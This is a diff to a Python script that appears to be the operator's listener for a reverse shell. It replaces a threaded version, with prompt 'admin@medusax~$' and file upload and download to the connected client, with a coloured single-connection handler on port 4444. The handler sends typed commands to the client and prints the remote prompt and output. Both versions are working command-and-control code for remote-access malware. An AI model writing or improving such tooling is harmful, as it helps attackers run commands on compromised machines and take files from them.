@@ -1,71 +1,48 @@
 import socket
-import threading
-import os
+from colorama import Fore, Style, init
 
-# Server setup
-SERVER_HOST = '0.0.0.0'
-SERVER_PORT = 9999
+# Initialize colorama
+init(autoreset=True)
 
-# Client handler function
-def handle_client(client_socket):
+# Server configuration
+HOST = "127.0.0.1"  # Replace with your server's IP address
+PORT = 4444  # Replace with your desired port
+
+# Print starting message
+print(Fore.GREEN + "Starting TCP Handler...")
+
+# Set up the server
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind((HOST, PORT))
+server.listen(5)
+
+# Wait for a connection
+print(Fore.YELLOW + f"Server listening on {Fore.CYAN}{HOST}:{PORT}")
+client_socket, client_address = server.accept()
+print(Fore.GREEN + f"Connection established with {client_address}")
+
+try:
     while True:
-        # Display a command prompt
-        command = input("admin@medusax~$ ")
+        # Receive the prompt from the client
+        prompt = client_socket.recv(1024).decode("utf-8")
+        print(Fore.CYAN + prompt, end="")
+
+        # Get user input
+        command = input()
 
         # Send the command to the client
-        client_socket.send(command.encode())
+        client_socket.sendall(command.encode("utf-8"))
 
-        # If command is 'exit', break the loop and close the connection
-        if command.lower() == 'exit':
-            print("Closing connection with client.")
+        if command.lower() == "km":
+            print(Fore.RED + "Disconnecting from client...")
             client_socket.close()
             break
 
-        # Receive response from the client
-        response = client_socket.recv(4096).decode()
-        print(response)
+        # Receive the output from the client
+        output = client_socket.recv(4096).decode("utf-8")
+        print(Fore.WHITE + output)
 
-        # Handle file upload and download commands
-        if command.startswith("upload"):
-            filename = command.split()[1]
-            upload_file(client_socket, filename)
-        elif command.startswith("download"):
-            filename = command.split()[1]
-            download_file(client_socket, filename)
-
-# File upload function
-def upload_file(client_socket, filename):
-    file_size = os.path.getsize(filename)
-    client_socket.send(f"upload {filename} {file_size}".encode())
-
-    with open(filename, "rb") as f:
-        client_socket.send(f.read())
-
-    print(f"File {filename} uploaded successfully.")
-
-# File download function
-def download_file(client_socket, filename):
-    client_socket.send(f"download {filename}".encode())
-
-    file_size = int(client_socket.recv(4096).decode())
-    with open(f"{filename}", "wb") as f:
-        data = client_socket.recv(file_size)
-        f.write(data)
-
-    print(f"File {filename} downloaded successfully.")
-
-# Start the server
-def start_server():
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind((SERVER_HOST, SERVER_PORT))
-    server.listen(5)
-    print(f"[*] Listening on {SERVER_HOST}:{SERVER_PORT}")
-
-    while True:
-        client_socket, addr = server.accept()
-        print(f"[+] Connection from {addr} has been established.")
-        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
-        client_handler.start()
-
-if __name__ == '__main__':
-    start_server()
+except KeyboardInterrupt:
+    print(Fore.RED + "\nShutting down the server.")
+    client_socket.close()
+    server.close()
